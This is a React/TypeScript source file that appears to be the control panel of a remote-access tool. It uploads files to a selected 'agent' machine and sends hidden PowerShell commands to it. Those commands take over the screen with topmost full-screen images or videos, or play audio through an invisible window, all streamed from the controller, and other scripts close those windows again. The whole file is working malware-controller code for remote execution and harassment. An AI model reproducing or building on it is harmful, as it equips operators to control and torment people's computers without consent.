import React, { useEffect, useState, useRef } from 'react';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Alert, AlertDescription } from './ui/alert';
import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2, Square } from 'lucide-react';
import { useSocket } from './SocketProvider';
import { Progress } from './ui/progress';

interface UploadedFile {
  id: string;
  name: string;
  size: number;
  type: string;
  content: string; // base64
  path?: string;
  raw?: File;
}

interface TrollingScript {
  type: 'image' | 'video';
  filename: string;
  path: string;
  script: string;
}

export function BulkUploadManager() {
  const { socket, selectedAgent } = useSocket();
  const [files, setFiles] = useState<UploadedFile[]>([]);
  const [folderPath, setFolderPath] = useState('');
  const [isDragging, setIsDragging] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [uploadProgress, setUploadProgress] = useState<Record<string, number>>({});
  const [uploadMeta, setUploadMeta] = useState<Record<string, { start: number; lastTime: number; received: number; total: number; speed: number; eta: number }>>({});
  const [trollVolume, setTrollVolume] = useState(100);
  const [trollLoop, setTrollLoop] = useState(true);
  const [trollAutoClose, setTrollAutoClose] = useState(0);

  const generateImageTrollingScript = (imagePath: string): string => {
    return `Add-Type -AssemblyName PresentationFramework
$w = New-Object Windows.Window
$w.Title = 'NCH_TROLLING'
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false

$i = New-Object Windows.Controls.Image
$b = New-Object Windows.Media.Imaging.BitmapImage
$b.BeginInit()
$b.UriSource = '${imagePath.replace(/\\/g, '\\\\')}'
$b.EndInit()
$i.Source = $b
$i.Stretch = 'UniformToFill'

$w.Content = $i
$w.ShowDialog()`;
  };

  const generateVideoTrollingScript = (videoPath: string, opts?: { volume?: number; loop?: boolean; autoClose?: number }): string => {
    const vol = Math.max(0, Math.min(1, (opts?.volume ?? 1)));
    const loop = Boolean(opts?.loop);
    const autoClose = Math.max(0, Math.floor(opts?.autoClose ?? 0));
    return `Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore

$w = New-Object Windows.Window
$w.Title = 'NCH_TROLLING'
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = 'Black'

$m = New-Object Windows.Controls.MediaElement
$m.Source = '${videoPath.replace(/\\/g, '\\\\')}'
$m.LoadedBehavior = 'Manual'
$m.UnloadedBehavior = 'Stop'
$m.Stretch = 'UniformToFill'
$m.Volume = ${vol}

$w.Content = $m
$w.Add_ContentRendered({
  try { $m.Play() } catch {}
})
${loop ? `Register-ObjectEvent -InputObject $m -EventName 'MediaEnded' -Action { $m.Position = [TimeSpan]::Zero; $m.Play() } | Out-Null` : ``}
${autoClose > 0 ? `$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds(${autoClose})
$timer.Add_Tick({ try { $timer.Stop(); $w.Close() } catch {} })
$timer.Start()` : ``}
$w.ShowDialog()`;
  };
  
  const generateAudioTrollingScript = (audioUrl: string, opts?: { volume?: number; loop?: boolean; autoClose?: number }): string => {
    const volPct = Math.max(0, Math.min(100, Math.round((opts?.volume ?? 1) * 100)));
    const loop = Boolean(opts?.loop);
    const autoClose = Math.max(0, Math.floor(opts?.autoClose ?? 0));
    return `$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
$w = New-Object Windows.Window
$w.Title = 'NCH_TROLLING_AUDIO'
$w.WindowStyle = 'None'
$w.WindowState = 'Normal'
$w.ResizeMode = 'NoResize'
$w.Topmost = $false
$w.ShowInTaskbar = $false
$w.Width = 1
$w.Height = 1
$w.Opacity = 0.0
$player = New-Object System.Windows.Media.MediaPlayer
try {
  $player.Open([Uri]'${audioUrl.replace(/\\/g, '\\\\')}')
  $player.Volume = ${Math.max(0, Math.min(1, (opts?.volume ?? 1)))}
  $player.MediaEnded += { if (${loop}) { $player.Position = [TimeSpan]::Zero; $player.Play() } else { try { $player.Close() } catch {} } }
  $player.Play()
} catch {}
if (${autoClose} -gt 0) {
  $timer = New-Object System.Windows.Threading.DispatcherTimer
  $timer.Interval = [TimeSpan]::FromSeconds(${autoClose})
  $timer.Add_Tick({ try { $timer.Stop(); $player.Close(); $w.Close() } catch {} })
  $timer.Start()
}
$w.ShowDialog()`;
  };

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const fileList = event.target.files;
    if (fileList) {
      processFiles(Array.from(fileList));
    }
  };

  const handleDrop = (event: React.DragEvent) => {
    event.preventDefault();
    setIsDragging(false);
    const fileList = event.dataTransfer.files;
    if (fileList) {
      processFiles(Array.from(fileList));
    }
  };

  const processFiles = async (fileList: File[]) => {
    setError('');
    setSuccess('');
    
    const processedFiles: UploadedFile[] = [];
    
    for (const file of fileList) {
      if (file.size > 50 * 1024 * 1024) { // 50MB limit
        setError(`File ${file.name} is too large (max 50MB)`);
        continue;
      }

      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi', 'audio/mpeg', 'audio/mp3', 'audio/wav', 'audio/flac', 'audio/ogg'];
      if (!allowedTypes.includes(file.type)) {
        setError(`File ${file.name} type not supported. Use: JPG, PNG, GIF, WebP, MP4, WebM, AVI`);
        continue;
      }

      try {
        const base64 = await fileToBase64(file);
        processedFiles.push({
          id: Math.random().toString(36).substr(2, 9),
          name: file.name,
          size: file.size,
          type: file.type,
          content: base64,
          path: folderPath || `C:\\Users\\${file.name}`,
          raw: file
        });
      } catch (err) {
        setError(`Failed to process ${file.name}: ${err}`);
      }
    }

    setFiles(prev => [...prev, ...processedFiles]);
    if (processedFiles.length > 0) {
      setSuccess(`Added ${processedFiles.length} files`);
    }
  };

  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => {
        const base64 = (reader.result as string).split(',')[1];
        resolve(base64);
      };
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });
  };
  
  const bytesToBase64 = (bytes: Uint8Array): string => {
    let binary = '';
    const CHUNK = 0x8000;
    for (let i = 0; i < bytes.length; i += CHUNK) {
      binary += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
    }
    return btoa(binary);
  };
  
  const formatBytesPerSec = (bps: number) => {
    if (!isFinite(bps) || bps <= 0) return '0 B/s';
    const k = 1024;
    if (bps < k) return `${Math.round(bps)} B/s`;
    if (bps < k * k) return `${(bps / k).toFixed(1)} KB/s`;
    if (bps < k * k * k) return `${(bps / (k * k)).toFixed(2)} MB/s`;
    return `${(bps / (k * k * k)).toFixed(2)} GB/s`;
  };
  
  const formatSeconds = (s: number) => {
    if (!isFinite(s) || s <= 0) return '—';
    const m = Math.floor(s / 60);
    const ss = Math.floor(s % 60);
    return `${m}:${ss.toString().padStart(2, '0')}`;
  };

  const uploadFile = async (file: UploadedFile) => {
    if (!socket || !selectedAgent) {
      setError('No agent selected');
      return;
    }

    setIsUploading(true);
    setError('');
    
    try {
      const uploadId = `ul_${Date.now()}_${Math.random().toString(16).slice(2)}`;
      const destination = file.path || `C:\\Users\\${file.name}`;
      socket.emit('upload_file_start', {
        agent_id: selectedAgent,
        upload_id: uploadId,
        filename: file.name,
        destination,
        total_size: file.size,
      });
      const chunkSize = 512 * 1024;
      if (file.raw) {
        for (let offset = 0; offset < file.raw.size; offset += chunkSize) {
          const slice = file.raw.slice(offset, offset + chunkSize);
          const buffer = await slice.arrayBuffer();
          const bytes = new Uint8Array(buffer);
          const chunkB64 = bytesToBase64(bytes);
          socket.emit('upload_file_chunk', {
            agent_id: selectedAgent,
            upload_id: uploadId,
            chunk: chunkB64,
            offset,
          });
        }
      } else {
        const binaryString = atob(file.content);
        const total = binaryString.length;
        for (let i = 0; i < total; i += chunkSize) {
          const slice = binaryString.slice(i, i + chunkSize);
          const chunkB64 = btoa(slice);
          socket.emit('upload_file_chunk', {
            agent_id: selectedAgent,
            upload_id: uploadId,
            chunk: chunkB64,
            offset: i,
          });
        }
      }
      const completionPromise = new Promise<void>((resolve, reject) => {
        const handler = (data: any) => {
          const ok = Boolean(data?.success);
          const fn = String(data?.filename || '');
          if (fn === file.name) {
            socket.off('file_upload_complete', handler);
            if (ok) resolve();
            else reject(new Error(data?.error || 'Upload failed'));
          }
        };
        socket.on('file_upload_complete', handler);
      });
      socket.emit('upload_file_complete', {
        agent_id: selectedAgent,
        upload_id: uploadId,
      });
      await completionPromise;
      setSuccess(`File ${file.name} uploaded successfully`);
      setFiles(prev => prev.filter(f => f.id !== file.id));
      
    } catch (err) {
      setError(`Upload failed: ${err}`);
    } finally {
      setIsUploading(false);
    }
  };

  const uploadAssetToController = async (file: UploadedFile): Promise<string> => {
    if (!socket) throw new Error('Socket not connected');
    const uploadId = `troll_${Date.now()}_${Math.random().toString(16).slice(2)}`;
    const totalSize = file.raw ? file.raw.size : (file.size || 0);
    return new Promise<string>(async (resolve, reject) => {
      const readyHandler = (data: any) => {
        if (String(data?.upload_id || '') !== uploadId) return;
        socket.off('troll_asset_ready', readyHandler);
        if (data?.error) reject(new Error(String(data.error)));
        else if (data?.url) resolve(String(data.url));
        else reject(new Error('No URL generated'));
      };
      const progressHandler = (data: any) => {
        if (String(data?.upload_id || '') !== uploadId) return;
        const pct = Number(data?.progress || 0);
        setUploadProgress(prev => ({ ...prev, [file.name]: pct }));
      };
      socket.on('troll_asset_ready', readyHandler);
      socket.on('troll_asset_progress', progressHandler);
      try {
        socket.emit('troll_asset_start', {
          upload_id: uploadId,
          filename: file.name,
          total_size: totalSize,
        });
        const chunkSize = 512 * 1024;
        if (file.raw) {
          for (let offset = 0; offset < file.raw.size; offset += chunkSize) {
            const slice = file.raw.slice(offset, offset + chunkSize);
            const buffer = await slice.arrayBuffer();
            const bytes = new Uint8Array(buffer);
            const chunkB64 = bytesToBase64(bytes);
            socket.emit('troll_asset_chunk', {
              upload_id: uploadId,
              chunk: chunkB64,
              offset,
            });
          }
        } else {
          const binaryString = atob(file.content);
          const total = binaryString.length;
          for (let i = 0; i < total; i += chunkSize) {
            const slice = binaryString.slice(i, i + chunkSize);
            const chunkB64 = btoa(slice);
            socket.emit('troll_asset_chunk', {
              upload_id: uploadId,
              chunk: chunkB64,
              offset: i,
            });
          }
        }
        socket.emit('troll_asset_complete', {
          upload_id: uploadId,
        });
      } catch (e) {
        socket.off('troll_asset_ready', readyHandler);
        socket.off('troll_asset_progress', progressHandler);
        reject(e);
      }
    });
  };

  const startTrolling = async (file: UploadedFile) => {
    if (!socket || !selectedAgent) {
      setError('No agent selected');
      return;
    }

    const filePath = file.path || `C:\\Users\\${file.name}`;
    let script: string;

    if (file.type.startsWith('image/')) {
      // Controller-hosted URL
      const url = await uploadAssetToController(file);
      script = generateImageTrollingScript(url);
    } else if (file.type.startsWith('video/')) {
      const url = await uploadAssetToController(file);
      script = generateVideoTrollingScript(url, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
    } else if (file.type.startsWith('audio/')) {
      const url = await uploadAssetToController(file);
      script = generateAudioTrollingScript(url, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
    } else {
      setError('Unsupported file type for trolling');
      return;
    }

    try {
      socket.emit('command', {
        agent_id: selectedAgent,
        command: `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`,
        execution_id: `trolling-${Date.now()}`
      });
      
      setSuccess(`Trolling started with ${file.name}`);
      
    } catch (err) {
      setError(`Trolling failed: ${err}`);
    }
  };
  
  useEffect(() => {
    const onProgress = (e: Event) => {
      const detail: any = (e as CustomEvent).detail;
      if (!detail) return;
      if (selectedAgent && detail.agent_id && detail.agent_id !== selectedAgent) return;
      const fn = String(detail.filename || '');
      const pct = Math.max(0, Math.min(100, Number(detail.progress || 0)));
      const received = Number(detail.received || 0);
      const total = Number(detail.total || 0);
      const now = Date.now() / 1000;
      setUploadMeta(prev => {
        const meta = prev[fn] || { start: now, lastTime: now, received, total, speed: 0, eta: 0 };
        const dt = Math.max(0.001, now - meta.lastTime);
        const dr = Math.max(0, received - meta.received);
        const inst = dr / dt;
        const speed = meta.speed ? (meta.speed * 0.7 + inst * 0.3) : inst;
        const remaining = Math.max(0, total - received);
        const eta = speed > 0 ? remaining / speed : 0;
        return { ...prev, [fn]: { start: meta.start, lastTime: now, received, total, speed, eta } };
      });
      setUploadProgress(prev => ({ ...prev, [fn]: pct }));
    };
    const onComplete = (e: Event) => {
      const detail: any = (e as CustomEvent).detail;
      if (!detail) return;
      if (selectedAgent && detail.agent_id && detail.agent_id !== selectedAgent) return;
      const fn = String(detail.filename || '');
      setUploadProgress(prev => ({ ...prev, [fn]: 100 }));
      setUploadMeta(prev => {
        const meta = prev[fn];
        if (!meta) return prev;
        return { ...prev, [fn]: { ...meta, received: meta.total, speed: meta.speed, eta: 0 } };
      });
    };
    window.addEventListener('file_upload_progress', onProgress as EventListener);
    window.addEventListener('file_upload_complete', onComplete as EventListener);
    return () => {
      window.removeEventListener('file_upload_progress', onProgress as EventListener);
      window.removeEventListener('file_upload_complete', onComplete as EventListener);
    };
  }, [selectedAgent]);

  const uploadAllFiles = async () => {
    if (files.length === 0) {
      setError('No files to upload');
      return;
    }

    setIsUploading(true);
    setError('');
    
    let successCount = 0;
    let errorCount = 0;

    for (const file of files) {
      try {
        await uploadFile(file);
        successCount++;
      } catch (err) {
        errorCount++;
        setError(`Failed to upload ${file.name}: ${err}`);
      }
    }

    setIsUploading(false);
    setSuccess(`Uploaded ${successCount} files, ${errorCount} failed`);
  };

  const removeFile = (fileId: string) => {
    setFiles(prev => prev.filter(f => f.id !== fileId));
  };

  const getFileIcon = (type: string) => {
    if (type.startsWith('image/')) return <Image className="h-4 w-4" />;
    if (type.startsWith('video/')) return <Video className="h-4 w-4" />;
    return <File className="h-4 w-4" />;
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle>Bulk File Upload & Trolling</CardTitle>
          <CardDescription>
            Upload files to selected agents and start trolling with images or videos
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}
          
          {success && (
            <Alert>
              <AlertDescription>{success}</AlertDescription>
            </Alert>
          )}

          <div className="space-y-2">
            <Label htmlFor="folder-path">Target Folder Directory</Label>
            <div className="flex gap-2">
              <Input
                id="folder-path"
                placeholder="C:\\Users\\Username\\Downloads"
                value={folderPath}
                onChange={(e) => setFolderPath(e.target.value)}
                className="font-mono"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => setFolderPath('C:\\Users\\')}
              >
                <Folder className="h-4 w-4" />
              </Button>
            </div>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="space-y-2">
              <Label>Volume</Label>
              <Input
                type="range"
                min={0}
                max={100}
                step={1}
                value={trollVolume}
                onChange={(e) => setTrollVolume(Number(e.target.value))}
              />
              <div className="text-xs text-muted-foreground">{trollVolume}%</div>
            </div>
            <div className="space-y-2">
              <Label>Loop Video</Label>
              <div className="flex items-center gap-2">
                <Button variant={trollLoop ? 'default' : 'outline'} size="sm" onClick={() => setTrollLoop(!trollLoop)}>
                  {trollLoop ? 'On' : 'Off'}
                </Button>
              </div>
              <div className="text-xs text-muted-foreground">Restart when finished</div>
            </div>
            <div className="space-y-2">
              <Label>Auto-Close (seconds)</Label>
              <Input
                type="number"
                min={0}
                step={1}
                value={trollAutoClose}
                onChange={(e) => setTrollAutoClose(Math.max(0, Number(e.target.value)))}
              />
              <div className="text-xs text-muted-foreground">{trollAutoClose > 0 ? `Closes after ${trollAutoClose}s` : 'No auto-close'}</div>
            </div>
          </div>

          <div
            className={`border-2 border-dashed rounded-lg p-8 text-center cursor-pointer transition-colors ${
              isDragging ? 'border-primary bg-primary/5' : 'border-border hover:border-primary'
            }`}
            onDragOver={(e) => {
              e.preventDefault();
              setIsDragging(true);
            }}
            onDragLeave={() => setIsDragging(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
          >
            <Upload className="mx-auto h-8 w-8 mb-2 text-muted-foreground" />
            <p className="text-sm text-muted-foreground mb-1">
              Drag and drop files here, or click to select
            </p>
            <p className="text-xs text-muted-foreground">
              Supports images (JPG, PNG, GIF, WebP) and videos (MP4, WebM, AVI)
            </p>
            <Input
              ref={fileInputRef}
              type="file"
              multiple
              accept="image/*,video/*"
              onChange={handleFileSelect}
              className="hidden"
            />
          </div>

          {files.length > 0 && (
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <h4 className="font-medium">Selected Files ({files.length})</h4>
                <Button
                  onClick={uploadAllFiles}
                  disabled={isUploading || !selectedAgent}
                  size="sm"
                >
                  <Upload className="h-4 w-4 mr-2" />
                  Upload All
                </Button>
              </div>
              
              <div className="space-y-1 max-h-64 overflow-y-auto">
                {files.map((file) => (
                  <div
                    key={file.id}
                    className="flex items-center gap-2 p-2 border rounded-md"
                  >
                    {getFileIcon(file.type)}
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium truncate">{file.name}</p>
                      <p className="text-xs text-muted-foreground">{formatFileSize(file.size)}</p>
                      <div className="mt-2">
                        <Progress value={uploadProgress[file.name] || 0} />
                        <div className="text-[10px] text-muted-foreground mt-1 flex items-center gap-2">
                          <span>{Math.round(uploadProgress[file.name] || 0)}%</span>
                          <span>•</span>
                          <span>{formatBytesPerSec(uploadMeta[file.name]?.speed || 0)}</span>
                          <span>•</span>
                          <span>ETA {formatSeconds(uploadMeta[file.name]?.eta || 0)}</span>
                        </div>
                      </div>
                    </div>
                    <div className="flex gap-1">
                    <Button
                      onClick={() => startTrolling(file)}
                      disabled={isUploading}
                      size="sm"
                      variant="outline"
                      title="Start trolling with this file"
                    >
                      <Play className="h-3 w-3" />
                    </Button>
                      <Button
                        onClick={() => {
                          if (!socket || !selectedAgent) return;
                          const stopScript = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class Win {
  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
  [DllImport("user32.dll")]
  public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
}
"@
$titles = @("NCH_TROLLING","NCH_TROLLING_AUDIO")
foreach ($t in $titles) {
  $h = [Win]::FindWindow($null, $t)
  if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPtr]::Zero) }
}`;
                          const cmd = `powershell -WindowStyle Hidden -Command "${stopScript.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
                          socket.emit('command', { agent_id: selectedAgent, command: cmd, execution_id: `stop-all-trolls-${Date.now()}` });
                        }}
                        disabled={isUploading}
                        size="sm"
                        variant="outline"
                        title="Stop All Trolls"
                      >
                        <Square className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => {
                          if (!socket || !selectedAgent) return;
                          const stopScript = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class Win {
  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
  [DllImport("user32.dll")]
  public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
}
"@
$h = [Win]::FindWindow($null, "NCH_TROLLING")
if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPtr]::Zero) }
`;
                          const cmd = `powershell -WindowStyle Hidden -Command "${stopScript.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
                          socket.emit('command', { agent_id: selectedAgent, command: cmd, execution_id: `stop-trolling-${Date.now()}` });
                        }}
                        disabled={isUploading}
                        size="sm"
                        variant="outline"
                        title="Stop trolling (close window)"
                      >
                        <Square className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => uploadFile(file)}
                        disabled={isUploading}
                        size="sm"
                        variant="outline"
                        title="Upload file"
                      >
                        <Upload className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => removeFile(file.id)}
                        size="sm"
                        variant="outline"
                        title="Remove file"
                      >
                        <Trash2 className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {!selectedAgent && (
            <Alert>
              <AlertDescription>
                Please select an agent from the Agents tab to upload files and start trolling
              </AlertDescription>
            </Alert>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
